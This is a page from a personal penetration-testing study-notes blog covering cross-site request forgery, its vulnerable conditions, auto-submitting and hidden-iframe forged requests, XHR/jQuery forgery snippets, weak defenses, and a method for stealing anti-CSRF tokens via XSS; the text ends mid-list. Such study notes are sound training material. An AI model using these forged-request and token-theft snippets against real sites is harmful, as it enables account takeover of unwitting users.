<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>5 - Cross-site request forgery (CSRF) |</title>
<meta name="description" content="Discovering, Execution and Bypass techniques ">


  <meta name="author" content="Nullified">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="">
<meta property="og:title" content="5 - Cross-site request forgery (CSRF)">
<meta property="og:url" content="http://localhost:4000/notes/ewptx/csrf/">


  <meta property="og:description" content="Discovering, Execution and Bypass techniques ">



  <meta property="og:image" content="http://localhost:4000/assets/images/main/header3.jpg">





  <meta property="article:published_time" content="2023-11-30T00:00:00+06:00">





  

  


<link rel="canonical" href="http://localhost:4000/notes/ewptx/csrf/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "john",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
        
        <a class="site-title" href="/">
          
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/menu">Menu</a>
            </li><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
  
    

    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header3.jpg');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          5 - Cross-site request forgery (CSRF)

        
      </h1>
      
        <p class="page__lead">Discovering, Execution and Bypass techniques
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  14 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  
  
    
      
      
      
      
    
    
      

<nav class="nav__list">
  
  <input id="ac-toc" name="accordion-toc" type="checkbox" />
  <label for="ac-toc">Toggle menu</label>
  <ul class="nav__items">
    
      <li>
        
          <span class="nav__sub-title">Posts</span>
        

        
        <ul>
          
            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
          
            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
          
            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
          
            <li><a href="">────────────────</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">Notes</span>
        

        
        <ul>
          
            <li><a href="/notes/ejpt/">eJPT</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/ecppt/">eCPPTv2</a></li>
          
            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
          
            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
          
            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
          
            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
          
            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
          
            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/pnpt/">PNPT</a></li>
          
            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
          
            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
          
            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
          
            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
          
            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
          
            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/eewptx/">eWPTXv2</a></li>
          
            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
          
            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
          
            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
          
            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/csrf/" class="active">- Cross-site request forgery (CSRF)</a></li>
          
            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
          
            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
          
            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
          
            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
          
            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
          
            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
          
            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
          
            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
          
            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="">Active Directory Exploitation</a></li>
          
            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
          
            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
          
            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crtp/">CRTP</a></li>
          
            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
          
            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
          
            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
          
            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
          
            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crte/">CRTE</a></li>
          
            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
          
            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
          
            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">My CVEs</span>
        

        
        <ul>
          
            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
          
            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
          
        </ul>
        
      </li>
    
  </ul>
</nav>

    
  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="5 - Cross-site request forgery (CSRF)">
    <meta itemprop="description" content="Discovering, Execution and Bypass techniques">
    <meta itemprop="datePublished" content="2023-11-30T00:00:00+06:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#cross-site-request-forgery">Cross-Site Request Forgery</a>
    <ul>
      <li><a href="#recap">Recap</a></li>
      <li><a href="#attack-vectors">Attack Vectors</a></li>
      <li><a href="#post-requests">Post Requests</a></li>
      <li><a href="#exploiting-weak-anti-csrf-measures">Exploiting Weak Anti-CSRF Measures</a></li>
      <li><a href="#advanced-csrf-exploitation">Advanced CSRF Exploitation</a></li>
      <li><a href="#csrf-in-3-steps">CSRF in 3 Steps</a></li>
      <li><a href="#bypassing-anti-csrf-token-brute-forcing">Bypassing Anti-CSRF Token Brute Forcing</a></li>
      <li><a href="#videos-notes">Video’s Notes</a></li>
      <li><a href="#lab-csrf">LAB CSRF</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="cross-site-request-forgery">Cross-Site Request Forgery</h1>

<ul>
  <li>
    <p><em>CSRF</em> or <em>XSRF</em> occurs when developers omit the prevention mechanisms.</p>
  </li>
  <li>
    <p>Is the most known flavor of the Session Riding attack category. Its also pronouced Sea Surf</p>
  </li>
  <li>
    <p>http://seclists.org/bugtraq/2001/Jun/217</p>
  </li>
</ul>

<h2 id="recap">Recap</h2>
<ul>
  <li>There is nothing wrong with requests such as requiring external hosted images, javascript code, stylesheet, etc.</li>
  <li>The wrong part is when these requests are forged in order to send money to the attacker by both performing privilegeda actions and other malicious operations.</li>
  <li>CSRF attacks allows one to exploit the trust relationship between a web app and the HTTP requests made by its users.</li>
  <li>This forces them to perform arbritary operations on behalf of the attacker</li>
</ul>

<h3 id="vulnerable">Vulnerable</h3>
<p>A web app is vuln to CSRF attacks IF:</p>
<ol>
  <li>When tracking sessions, the application relies both on mechanisms like HTTP cookies and Basic Authentication, which are automatically injected into the request by the browser.</li>
  <li>The attacker is able to determine all the required parameters in order to perform the malicious request.</li>
</ol>

<h3 id="in-order-to-exploit">In order to exploit:</h3>
<ol>
  <li>Make sure that the victim has a valid and active session when the malicious request is executed.</li>
  <li>Be able to forge a valid request on behalf of the victim</li>
</ol>

<h3 id="vulnerable-scenarios">Vulnerable Scenarios</h3>
<ul>
  <li>When the application lacks anti-CSRF defenses</li>
  <li>When the application contains weak anti-CSRF defense mechanisms such as cookie-only based solutions, confirmation screens, using POST, and checking the referer header.</li>
</ul>

<blockquote>
  <p>CSRF = an attacker can send a request on behalf of ht victim using their browser, which simply means that the attacker can target any website that is accessible from the victim side.</p>
</blockquote>

<h2 id="attack-vectors">Attack Vectors</h2>

<p>Force Browsing with GET</p>

<h3 id="change-email-address">Change Email Address</h3>
<p>Lets say, provide the new address and subit the form</p>

<ul>
  <li>By default the HTTP method is GET</li>
  <li>To exploit this vuln, we need to generate a GET request and then trick the victim (or their browser) into executing it.</li>
</ul>

<p>The simplest method to generate a GET request is to use images. This is merely because Getis the standard method used when requesting an image with HTML</p>

<blockquote>
  <p>To deliver the attack, we must exploit an existing flaw like XSS, and inject either HTML or Javascript.</p>
</blockquote>

<blockquote>
  <p>Otherwise, we need to social engineer the victim in order to have them visit our malicious page or click a link we provide.</p>
</blockquote>

<p>Tags supported by HTML4 and HTML5</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.w3.org/TR/REC-html40/index/attributes.html
http://www.w3.org/html/wg/drafts/html/master/index.html#attributes-1
</code></pre></div></div>

<p>REQUIRE User Interaction:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">href</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span><span class="nx">click</span> <span class="nx">here</span>
<span class="o">&lt;</span><span class="nx">form</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">formaction</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">button</span> <span class="nx">formaction</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>DO NOT REQUIRE User Interaction:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">image</span><span class="dl">"</span> <span class="nx">src</span><span class="o">=</span><span class="nx">URL</span> <span class="nx">alt</span><span class="o">=</span><span class="dl">""</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">embed</span> <span class="nx">src</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">audio</span> <span class="nx">src</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">video</span> <span class="nx">src</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">source</span> <span class="nx">src</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">video</span> <span class="nx">poster</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">link</span> <span class="nx">rel</span><span class="o">=</span><span class="dl">"</span><span class="s2">stylesheet</span><span class="dl">"</span> <span class="nx">href</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">body</span> <span class="nx">background</span><span class="o">=</span><span class="nx">URL</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">backgound:url(URL)</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">style</span><span class="o">&gt;</span><span class="nx">body</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span><span class="nf">url</span><span class="p">(</span><span class="nx">URL</span><span class="p">)</span> <span class="p">}</span> <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h2 id="post-requests">Post Requests</h2>
<p>Using only HTML, the only way to forge POST requests is with the attribute method of tah FORM:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="dl">"</span><span class="s2">somewhere</span><span class="dl">"</span> <span class="nx">method</span><span class="o">=</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>As a result, we need to create a cloned form and then social engineer the victim into clicking the submit button.</p>
  </li>
  <li>
    <p>We can use HTML + Javascript to create a more effective attack that does not require user interaction</p>
  </li>
</ul>

<h3 id="auto-submitting-form">Auto-submitting Form</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">CSRForm</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">()</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>We can use event handlers such as <strong>onload</strong> and <strong>onerror</strong> because they do not require user interaction:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">CSRForm.submit();</span><span class="dl">"</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>in HTML5 we can use <strong>autofocus</strong> and the related event handler <strong>onfocus</strong>:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">new</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">evil@hacker.site</span><span class="dl">"</span> <span class="nx">autofocus</span> <span class="nx">onfocus</span><span class="o">=</span><span class="dl">"</span><span class="s2">CSRForm.submit()</span><span class="dl">"</span><span class="o">&gt;</span>
</code></pre></div></div>

<h3 id="how-to-perform-post-requests-silently">How to perform POST requests silently</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">display:none</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">CSRFrame</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/iframe</span><span class="err">&gt;
</span>
<span class="err">#</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">form</span> <span class="nx">we</span> <span class="nx">add</span> <span class="nx">target</span><span class="o">=</span><span class="dl">"</span><span class="s2">CSRFrame</span><span class="dl">"</span> 
<span class="err">#</span> <span class="nx">display</span> <span class="nx">the</span> <span class="nx">response</span> <span class="nx">received</span> <span class="nx">submitting</span> <span class="nx">the</span> <span class="nx">form</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">iframe</span>
</code></pre></div></div>

<p>Can be forged using XMLHttpReques(<strong>XHR</strong>) also:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">url</span><span class="o">=</span><span class="dl">"</span><span class="s2">URL</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">old=mycoolemail@victim.site&amp;new=eviL@hacker.site</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">CSRF</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">CSRF</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="nx">CSRF</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">CSRF</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span>
</code></pre></div></div>

<p>Can also be done using JavaScript libraries such as JQuery:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">URL</span><span class="dl">"</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">old=mycoolemail@victim.site&amp;new=eviL@hacker.site</span><span class="dl">"</span><span class="p">,});</span>
</code></pre></div></div>

<h2 id="exploiting-weak-anti-csrf-measures">Exploiting Weak Anti-CSRF Measures</h2>

<h3 id="using-post-only-requests">Using POST-only Requests</h3>
<ul>
  <li>Get requests can be cached, bookmarked, etc. It should not be used For operations that cause a state to change. These may include functionality like database operations, writings files, etc.</li>
  <li>POST requests For sensitive informations is better practice and protects against a well-known class of CSRF attack vectors.</li>
</ul>

<h3 id="multi-step-transactions">Multi-Step Transactions</h3>
<ul>
  <li>As long as we are able to either predict or deduce the steps necessary to complete a task, then CSRF is possible.</li>
  <li>IF the app implements multi=step transactions, these are in no way a protection mechanism.</li>
</ul>

<h3 id="checking-referer-header">Checking Referer Header</h3>
<ul>
  <li>It allows a server to check where a request was orifinated and therefore perform logging, optimized chaching. etc.</li>
  <li>Some implementation mistakens are that the referrer not being sent if the website is using SSL/TLS. This does not take into consideration that firewalls, corporate proxies, etc, might remove this header</li>
  <li>It can help in detecting some attacks. However, it will not stop all attacks. An example is an XSS flaw in the same origin.</li>
</ul>

<h3 id="predicatable-anti-csrf-token">Predicatable Anti-CSRF Token</h3>
<ul>
  <li>One of the most effective solutions For reducing the likelihood of CSRF exploitation is to use a Synchronizer Token Pattern, commonly called anti-CSRF Tokens.</li>
  <li>This design pattern requires the generating of a challenge token that will be inserted within the HTML page. Another countermeasure might be SameSite Cookie.</li>
</ul>

<p>Synchronizer Token Pattern: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</p>

<p>sameSite Cookie: https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7</p>

<blockquote>
  <p>its essential that the token values are randomly generated</p>
</blockquote>

<h3 id="unverified-anti-csrf-token">Unverified Anti-CSRF Token</h3>
<p>Another possible scenario is when the application implements strong Anti-CSRF tokens but lacks the verification server-side.</p>

<h3 id="secret-cookies">Secret Cookies</h3>
<p>The concept with this technique is to create a cookie containing secret information (MD5 hash of a random secret) and then check if its included in the users request.</p>

<p>Clearly, this is not in any way a security measure. Cookies, both by specification and design, are sent with every request. Therefore, once a user sets a cookie, they are passed to the site/app no matter what, regardless of user intention.</p>

<h2 id="advanced-csrf-exploitation">Advanced CSRF Exploitation</h2>

<h3 id="bypassing-csrf-defenses-with-xss">Bypassing CSRF Defenses with XSS</h3>
<p>A single XSS flaw is like a storm that overwhelms the entire CSRF protection system.</p>

<blockquote>
  <p>Technically, once we have exploited an XSS flaw, we are in the same origin of the CSR. All defenses against CSRF, except Challenge-Response mechanisms, are useless.</p>
</blockquote>

<p>Can be Bypassed:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Synchronized token
- Checking the Referer Header
- Checking the Origin Header
</code></pre></div></div>

<p>→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern</p>

<p>→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers</p>

<p>→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers</p>

<h3 id="bypassing-header-checks">Bypassing Header Checks</h3>
<p>Checking Referer and Origin header simply means that the request must come from a proper origin.</p>

<blockquote>
  <p>Bypassing these types of defenses measures are straightforward as long as we have effectively exploited an XSS vulnerability.</p>
</blockquote>

<h3 id="bypassing-anti-csrf-token">Bypassing Anti-CSRF Token</h3>
<p>We need to hijack the anti-csrf token from a valid form and then use the token stolen in our forged form.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Once the XSS has been detected &gt; Two scenarios:
1 - Occurs when XSS and CSRF-protected forms are contained on the same page
2 - XSS flaw is located in another part of the web application
</code></pre></div></div>
<p>Steps to bypass anti-CSRF mechanisms:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Useless if the XSS is in the same page
- 1. Request a valid form (with a valid token)
- 2. Extract the valid token from the source code
- 3. Forge the form with the stolen token
</code></pre></div></div>

<h2 id="csrf-in-3-steps">CSRF in 3 Steps</h2>

<h3 id="1---request-a-valid-form-with-a-valid-token">1 - Request a valid form with a valid Token</h3>
<p>We need the HTML of the page where the target form is located.</p>

<ul>
  <li>Worst case scenario, the XSS is not located on the same page of the target form; therefore, we can not access the DOM directly using JavaScript. Thus, we need to GET the HTML source of the page.</li>
  <li>To get the pages HTML using XMLHttpRequest is simple:</li>
</ul>

<p>→ http://xhr.spec.whatwg.org/</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">htmlSource</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span> <span class="c1">// the source code</span>
    <span class="c1">// some operations</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://victim.site/csrf-form-page.html</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
</code></pre></div></div>

<blockquote>
  <p>The first step is to request a valid form with a valid token by using some form of the following JQuery code:</p>
</blockquote>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">JReq</span> <span class="o">=</span> <span class="nx">JQuery</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://victim.site/csrf-form-page.html</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">htmlSource</span> <span class="o">=</span> <span class="nx">JReq</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span> <span class="c1">// the source code</span>
  <span class="c1">// some operations</span>
  <span class="p">});</span>
</code></pre></div></div>

<h3 id="2---extract-the-valid-token-from-the-source-code">2 - Extract the valid Token from the Source Code</h3>
<p>in the best scenario, we can access the DOM quite easily:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">csrf_token</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span>
</code></pre></div></div>

<p>Whereas, there are multiple options available to both inspect the string result and extract the anti-csrf token.</p>

<p>THe first options is by using regex-based <strong>DOMParser API</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://developer.mozilla.org/en-US/docs/Web/API/DOMParser
</code></pre></div></div>

<p><img src="/assets/images/posts/ewptx/58.png" alt="Alt text" class="align-center" /></p>

<h3 id="3---forge-the-form-with-the-stolen-token">3 - Forge the Form with the Stolen Token</h3>
<p>Once we have a valid token, is to add the anti-csrf token in the forged form and send the attack by using the techniques we have seen in the previous sections.</p>

<h2 id="bypassing-anti-csrf-token-brute-forcing">Bypassing Anti-CSRF Token Brute Forcing</h2>
<ul>
  <li>The Anti-csrf tokens must be random and unpredictable. Otherwise it becomes expose to brute force attacks.</li>
